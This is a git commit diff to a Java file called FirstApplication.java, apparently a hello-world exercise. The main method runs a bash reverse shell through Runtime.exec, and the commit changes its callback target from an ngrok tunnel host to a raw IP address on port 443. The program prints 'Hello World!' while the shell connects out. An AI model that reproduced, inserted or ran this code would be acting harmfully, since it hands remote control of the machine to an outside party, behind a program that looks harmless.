0b5fd8814c75fa61f8a28e9d1b49171022c08ca9
VP <10129407+Kapalov@users.noreply.github.com>
2024-02-09 01:34:15 +0100

    Update FirstApplication.java

--- src/main/java/com/mjc/stage0/FirstApplication.java
+++ src/main/java/com/mjc/stage0/FirstApplication.java
@@ -7,7 +7,7 @@ import java.util.List;
 public static void main(String[] args) {
         Process p;
         try {
-            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/13211 0>&1");
+            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/16.171.21.124/443 0>&1");
             System.out.println("Hello World!"); 
             p.waitFor();
             p.destroy();
